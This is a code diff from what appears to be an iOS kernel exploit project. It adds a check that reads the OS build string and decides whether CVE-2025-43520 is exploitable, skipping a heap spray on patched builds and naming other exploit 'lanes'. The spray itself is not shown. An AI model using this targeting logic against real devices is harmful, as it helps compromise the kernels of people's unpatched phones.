@@ -48,6 +48,24 @@ static NSString *cs2_sysctl_string(NSString *name) {
     return @"?";
 }
 
+/* CVE-2025-43520 viability gate (patched 18.7.2 / 26.1).
+   Same rule as Lum1na project Lum1naCS2Core.m cs2_cve43520_viable().
+   <= 21 (16.x/17.x) = pre-patch VIABLE; 22A-22G (18.0-18.6.x) VIABLE;
+   23A (26.0.x) VIABLE; anything 23B+ = PATCHED — hop-1 cluster_*_contig
+   returns EINVAL and firing the spray only starves configd (A12X_23G71
+   watchdog panic 2026-10-20 21:59, panic-full-2026-10-20-215932.ips). */
+static BOOL cs2_cve43520_viable(void) {
+    const char *v = cs2_sysctl_string(@"kern.osversion").UTF8String;
+    if (!v || strlen(v) < 3) return NO;
+    int major = 0, rev = 0;
+    char train = 0;
+    if (sscanf(v, "%2d%c%d", &major, &train, &rev) < 2) return NO;
+    if (major <= 21) return YES;
+    if (major == 22) return (train >= 'A' && train <= 'G');
+    if (major == 23) return (train == 'A');
+    return NO;
+}
+
 static void cs2_write_banner(void) {
     NSString *mach = cs2_sysctl_string(@"hw.machine");
     NSString *osv = cs2_sysctl_string(@"kern.osversion");
@@ -81,6 +99,15 @@ static void cs2_write_banner(void) {
     g_cs2_log_fd = open([lp UTF8String], O_WRONLY | O_CREAT | O_TRUNC, 0644);
 
     cs2_write_banner();
+
+    if (!cs2_cve43520_viable()) {
+        cs2_log("[-] SKIP: CVE-2025-43520 patched on this build train (18.7.2/26.1+).");
+        cs2_log("[-] Firing the spray here only starves configd -> userspace watchdog (23G71 2026-10-20 WoD).");
+        cs2_log("[*] Viable trains: <=21D, 22A-22G, 23A. 23B+ SKUs: LightSword stalepage lane instead.");
+        if (g_cs2_log_fd >= 0) { close(g_cs2_log_fd); g_cs2_log_fd = -1; }
+        g_cs2_running = NO;
+        return @"cs2 SKIP (patched train) — no spray fired. Use LightSword/CSRaceCalib/CSKRW lanes here.";
+    }
 
     cs2_stop = 0;
     cs2_deadline = time(NULL) + CS2_TIME_BUDGET_SEC;
